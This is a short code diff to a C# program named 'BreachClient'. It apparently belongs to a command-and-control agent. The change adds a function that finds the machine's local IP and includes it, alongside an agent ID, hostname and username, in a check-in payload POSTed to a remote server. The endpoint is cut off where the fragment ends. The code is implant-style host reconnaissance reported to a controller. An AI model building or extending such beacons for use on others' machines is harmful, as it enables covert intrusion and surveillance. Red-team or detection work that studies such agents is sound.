@@ -37,13 +37,25 @@ namespace BreachClient
             }
         }
 
+        static string GetLocalIP()
+        {
+            try
+            {
+                using var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
+                socket.Connect("8.8.8.8", 65530);
+                return ((IPEndPoint)socket.LocalEndPoint!).Address.ToString();
+            }
+            catch { return ""; }
+        }
+
         static async Task Checkin()
         {
             var payload = JsonSerializer.Serialize(new
             {
                 agent_id = AgentId,
                 hostname = Environment.MachineName,
-                username = Environment.UserName
+                username = Environment.UserName,
+                ip       = GetLocalIP()
             });
 
             var response = await http.PostAsync(
